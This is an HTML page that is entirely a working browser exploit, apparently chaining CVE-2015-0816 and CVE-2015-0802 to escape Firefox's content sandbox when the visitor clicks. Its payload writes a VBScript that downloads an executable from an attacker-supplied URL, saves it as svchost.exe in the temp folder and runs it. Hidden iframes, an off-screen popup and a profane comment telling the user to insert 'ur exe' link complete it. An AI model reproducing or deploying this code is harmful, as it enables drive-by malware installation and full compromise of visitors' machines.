<!doctype html>
<html>
<body>Very Dank Exploit! CVE-2015-0816 AND CVE-2015-0802

<span style='text-decoration:underline;'>Click Here To Exploit! OR ANYWHERE :D</span>
<script>
function xml2string(obj) {
  return new XMLSerializer().serializeToString(obj);
}

function __proto(obj) {
  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;
}

function get(path, callback, timeout, template, value) {
  callback = _(callback);
  if (template && value) {
    callback = callback.replace(template, value);
  }

  js_call1 = 'javascript:' + _(function() {
    try {
      done = false;
      window.onclick = function() {
        if (done) { return; } done = true;
        q = open("%url%", "q", "chrome,,top=-9999px,left=-9999px,height=1px,width=1px");
        setTimeout(function(){
          q.location='data:text/html,<iframe mozbrowser src="about:blank"></iframe>';
	///////////////////////////////////////////////////
	///////EDIT THEURLTOMYGAYGODDAMNMOTHERFUCKINGEXE THIS TO THE DIRECT LINK TO UR EXE!!!!
	//////////////////////////////////////////////////
            setTimeout(function(){
            var opts = {"ktBUxjuK":"\n      (function(){\n        window = this;\n        \n      var readFile = function(path) {\n        try {\n          var file = Components.classes[\"@mozilla.org/file/local;1\"]\n                   .createInstance(Components.interfaces.nsILocalFile);\n          file.initWithPath(path);\n\n          var fileStream = Components.classes[\"@mozilla.org/network/file-input-stream;1\"]\n                           .createInstance(Components.interfaces.nsIFileInputStream);\n          fileStream.init(file, 1, 0, false);\n\n          var binaryStream = Components.classes[\"@mozilla.org/binaryinputstream;1\"]\n                             .createInstance(Components.interfaces.nsIBinaryInputStream);\n          binaryStream.setInputStream(fileStream);\n          var array = binaryStream.readByteArray(fileStream.available());\n\n          binaryStream.close();\n          fileStream.close();\n          file.remove(true);\n\n          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join(\"\");\n        } catch (e) { return \"\"; }\n      };\n    \n        \n      \n      var readFile = function(path) {\n        try {\n          var file = Components.classes[\"@mozilla.org/file/local;1\"]\n                   .createInstance(Components.interfaces.nsILocalFile);\n          file.initWithPath(path);\n\n          var fileStream = Components.classes[\"@mozilla.org/network/file-input-stream;1\"]\n                           .createInstance(Components.interfaces.nsIFileInputStream);\n          fileStream.init(file, 1, 0, false);\n\n          var binaryStream = Components.classes[\"@mozilla.org/binaryinputstream;1\"]\n                             .createInstance(Components.interfaces.nsIBinaryInputStream);\n          binaryStream.setInputStream(fileStream);\n          var array = binaryStream.readByteArray(fileStream.available());\n\n          binaryStream.close();\n          fileStream.close();\n          file.remove(true);\n\n          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join(\"\");\n        } catch (e) { return \"\"; }\n      };\n    \n      \n      var setTimeout = function(cb, delay) {\n        var timer = Components.classes[\"@mozilla.org/timer;1\"].createInstance(Components.interfaces.nsITimer);\n        timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);\n        return timer;\n      };\n    \n\n      var ua = Components.classes[\"@mozilla.org/network/protocol;1?name=http\"]\n        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;\n      var windows = (ua.indexOf(\"Windows\")>-1);\n      var svcs = Components.utils.import(\"resource://gre/modules/Services.jsm\");\n      var jscript = ({\"src\":\"\\n      var b64 = WScript.arguments(0);\\n      var dom = new ActiveXObject(\\\"MSXML2.DOMDocument.3.0\\\");\\n      var el  = dom.createElement(\\\"root\\\");\\n      el.dataType = \\\"bin.base64\\\"; el.text = b64; dom.appendChild(el);\\n      var stream = new ActiveXObject(\\\"ADODB.Stream\\\");\\n      stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);\\n      stream.Position=0; stream.type=2; stream.CharSet = \\\"us-ascii\\\"; stream.Position=0;\\n      var cmd = stream.ReadText();\\n      (new ActiveXObject(\\\"WScript.Shell\\\")).Run(cmd, 0, true);\\n    \"}).src;\n      var runCmd = function(cmd, cb) {\n        cb = cb || (function(){});\n\n        if (cmd.trim().length == 0) {\n          setTimeout(function(){ cb(\"Command is empty string ('').\"); });\n          return;\n        }\n\n        var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());\n        if (js) {\n          var tag = \"[!JAVASCRIPT]\";\n          var sync = true;  /* avoid zalgo's reach */\n          var sent = false;\n          var retVal = null;\n\n          try {\n            this.send = function(r){\n              if (sent) return;\n              sent = true;\n              if (r) {\n                if (sync) setTimeout(function(){ cb(false, r+tag+\"\\n\"); });\n                else      cb(false, r+tag+\"\\n\");\n              }\n            };\n            retVal = Function(js[1]).call(this);\n          } catch (e) { retVal = e.message; }\n\n          sync = false;\n\n          if (retVal && !sent) {\n            sent = true;\n            setTimeout(function(){ cb(false, retVal+tag+\"\\n\"); });\n          }\n\n          return;\n        }\n\n        var shEsc = \"\\\\$&\";\n        var shPath = \"/bin/sh -c\";\n\n        if (windows) {\n          shPath = \"cmd /c\";\n          shEsc = \"\\^$&\";\n          var jscriptFile = Components.classes[\"@mozilla.org/file/directory_service;1\"]\n            .getService(Components.interfaces.nsIProperties)\n            .get(\"TmpD\", Components.interfaces.nsIFile);\n          jscriptFile.append('sBK17FE23scOzIpwvmX.js');\n          var stream = Components.classes[\"@mozilla.org/network/safe-file-output-stream;1\"]\n            .createInstance(Components.interfaces.nsIFileOutputStream);\n          stream.init(jscriptFile, 0x04 | 0x08 | 0x20, 0666, 0);\n          stream.write(jscript, jscript.length);\n          if (stream instanceof Components.interfaces.nsISafeOutputStream) {\n            stream.finish();\n          } else {\n            stream.close();\n          }\n        }\n\n        var stdoutFile = \"3LiEHIRZVyDdXtci\";\n\n        var stdout = Components.classes[\"@mozilla.org/file/directory_service;1\"]\n          .getService(Components.interfaces.nsIProperties)\n          .get(\"TmpD\", Components.interfaces.nsIFile);\n        stdout.append(stdoutFile);\n\n        var shell;\n        cmd = cmd.trim();\n        if (windows) {\n          shell = shPath+\" \"+cmd;\n          shell = shPath+\" \"+shell.replace(/\\W/g, shEsc)+\" >\"+stdout.path+\" 2>&1\";\n          var b64 = svcs.btoa(shell);\n        } else {\n          shell = shPath+\" \"+cmd.replace(/\\W/g, shEsc);\n          shell = shPath+\" \"+shell.replace(/\\W/g, shEsc) + \" >\"+stdout.path+\" 2>&1\";\n        }\n\n        var process = Components.classes[\"@mozilla.org/process/util;1\"]\n          .createInstance(Components.interfaces.nsIProcess);\n        var sh = Components.classes[\"@mozilla.org/file/local;1\"]\n                   .createInstance(Components.interfaces.nsILocalFile);\n\n        if (windows) {\n          sh.initWithPath(\"C:\\\\Windows\\\\System32\\\\wscript.exe\");\n          process.init(sh);\n          var args = [jscriptFile.path, b64];\n          process.run(true, args, args.length);\n          jscriptFile.remove(true);\n          setTimeout(function(){cb(false, cmd+\"\\n\"+readFile(stdout.path));});\n        } else {\n          sh.initWithPath(\"/bin/sh\");\n          process.init(sh);\n          var args = [\"-c\", shell];\n          process.run(true, args, args.length);\n          setTimeout(function(){cb(false, readFile(stdout.path));});\n        }\n      };\n    \n\n        var ua = Components.classes[\"@mozilla.org/network/protocol;1?name=http\"]\n        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;\n        var windows = (ua.indexOf(\"Windows\")>-1);\n\n        var cmd = ({\"cmd\":\"cmd.exe /c \\\"@echo Set objXMLHTTP=CreateObject(\\\"MSXML2.XMLHTTP\\\")>%tmp%\\\\exp.vbs&@echo objXMLHTTP.open \\\"GET\\\",\\\"THEURLTOMYGAYGODDAMNMOTHERFUCKINGEXE\\\",false>>%tmp%\\\\exp.vbs&@echo objXMLHTTP.send()>>%tmp%\\\\exp.vbs&@echo If objXMLHTTP.Status=200 Then>>%tmp%\\\\exp.vbs&@echo Set objADOStream=CreateObject(\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\adodb.stream\\\")>>%tmp%\\\\exp.vbs&@echo objADOStream.Open>>%tmp%\\\\exp.vbs&@echo objADOStream.Type=1 >>%tmp%\\\\exp.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>%tmp%\\\\exp.vbs&@echo objADOStream.Position=1 >>%tmp%\\\\exp.vbs&@echo objADOStream.SaveToFile \\\"%tmp%\\\\svchost.exe\\\",2 >>%tmp%\\\\exp.vbs&@echo objADOStream.Close>>%tmp%\\\\exp.vbs&@echo Set objADOStream=nothing>>%tmp%\\\\exp.vbs&@echo End if>>%tmp%\\\\exp.vbs&@echo Set objXMLHTTP=nothing>>%tmp%\\\\exp.vbs&@echo Set objShell=CreateObject(\\\"WScript.Shell\\\")>>%tmp%\\\\exp.vbs&@echo objShell.Exec(\\\"%tmp%\\\\svchost.exe\\\")>>%tmp%\\\\exp.vbs&cscript.exe %tmp%\\\\exp.vbs\\\"\"}).cmd;\n        if (true && windows) {\n          runCmd(cmd);\n        } else {\n          var process = Components.classes[\"@mozilla.org/process/util;1\"]\n                          .createInstance(Components.interfaces.nsIProcess);\n          var sh = Components.classes[\"@mozilla.org/file/local;1\"]\n                    .createInstance(Components.interfaces.nsILocalFile);\n          var args;\n          if (windows) {\n            sh.initWithPath(\"C:\\\\Windows\\\\System32\\\\cmd.exe\");\n            args = [\"/c\", cmd];\n          } else {\n            sh.initWithPath(\"/bin/sh\");\n            args = [\"-c\", cmd];\n          }\n          process.init(sh);\n          process.run(true, args, args.length);\n        }\n      })();\n\n"};
    
			 var key = opts['ktBUxjuK'];
              q.messageManager.loadFrameScript('data:,'+key, false);
              setTimeout(function(){
                q.close();
              }, 100)
            }, 100)
        }, 100);
      }
    } catch (e) {
      history.back();
    }
    undefined;
  }, "%url%", path);
  js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';
  sandboxContext(_(function() {
    p = __proto(i.contentDocument.styleSheets[0].ownerNode);
    l = p.__lookupSetter__.call(i2.contentWindow, 'location');
    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
  }));
  setTimeout((function() {
    sandboxContext(_(function() {
      p = __proto(i.contentDocument.styleSheets[0].ownerNode);
      l = p.__lookupSetter__.call(i2.contentWindow, 'location');
      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);
    }));
  }), timeout);
}

function get_data(obj) {
  data = null;
  try {
    data = obj.document.documentElement.innerHTML;
    if (data.indexOf('dirListing') < 0) {
      throw new Error();
    }
  } catch (e) {
    if (this.document instanceof XMLDocument) {
        data = xml2string(this.document);
    } else {
      try {
          if (this.document.body.firstChild.nodeName.toUpperCase() == 'PRE') {
              data = this.document.body.firstChild.textContent;
          } else {
              throw new Error();
          }
      } catch (e) {
        try {
          if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') > -1) {;
              return null;
          } else {
              throw new Error();
          }
        } catch (e) {
          ;;
        }
      }
    }
  }
  return data;
}

function _(s, template, value) {
  s = s.toString().split(/^\s*function\s+\(\s*\)\s*\{/)[1];
  s = s.substring(0, s.length - 1);
  if (template && value) {
    s = s.replace(template, value);
  }
  s += __proto;
  s += xml2string;
  s += get_data;
  s = s.replace(/\s\/\/.*\n/g, "");
  s = s + ";undefined";
  return s;
}

function get_sandbox_context() {
  if (window.my_win_id == null) {
    for (var i = 0; i < 20; i++) {
      try {
        if (window[i].location.toString().indexOf("view-source:") != -1) {
          my_win_id = i;
          break;
        }
      } catch (e) {}
    }
  };
  if (window.my_win_id == null)
    return;
  clearInterval(sandbox_context_i);
  object.data = 'view-source:' + blobURL;
  window[my_win_id].location = 'data:application/x-moz-playpreview-pdfjs;,';
  object.data = 'data:text/html,<'+'html/>';
  window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe style='+
    '"position:absolute; left:-9999px;" onload = "'+_(function(){
    window.wrappedJSObject.sandboxContext=(function(cmd) {
      with(importFunction.constructor('return this')()) {
        return eval(cmd);
      }
    });
  }) + '"/>');
}

var HIDDEN = 'position:absolute;left:-9999px;height:1px;width:1px;';
var i = document.createElement("iframe");
i.id = "i";
i.style=HIDDEN;
i.src = "data:application/xml,<?xml version=\"1.0\"?><e><e1></e1></e>";
document.documentElement.appendChild(i);
i.onload = function() {
  if (this.contentDocument.styleSheets.length > 0) {
    var i2 = document.createElement("iframe");
    i2.id = "i2";
    i2.style='opacity: 0;position:absolute;top:0;left:0;right:0;bottom:0;';
    i2.height = window.innerHeight+'px';
    i2.width = window.innerWidth+'px';
    i2.src = "data:application/pdf,";
    document.documentElement.appendChild(i2);
    pdfBlob = new Blob([''], {
        type: 'application/pdf'
    });
    blobURL = URL.createObjectURL(pdfBlob);
    object = document.createElement('object');
    object.style=HIDDEN;
    object.data = 'data:application/pdf,';
    object.onload = (function() {
        sandbox_context_i = setInterval(get_sandbox_context, 200);
        object.onload = null;
        object.data = 'view-source:' + location.href;
        return;
    });
    document.documentElement.appendChild(object);
  } else {
    this.contentWindow.location.reload();
  }
}

document.body.style.height = window.innerHeight+'px';

var kill = setInterval(function() {
  if (window.sandboxContext) {
    var f = "chrome://browser/content/browser.xul";
    get(f, function() {}, 0, "%URL%", f);
    clearInterval(kill);
  } else {
    return;
  }
},20);

</script></body></html>
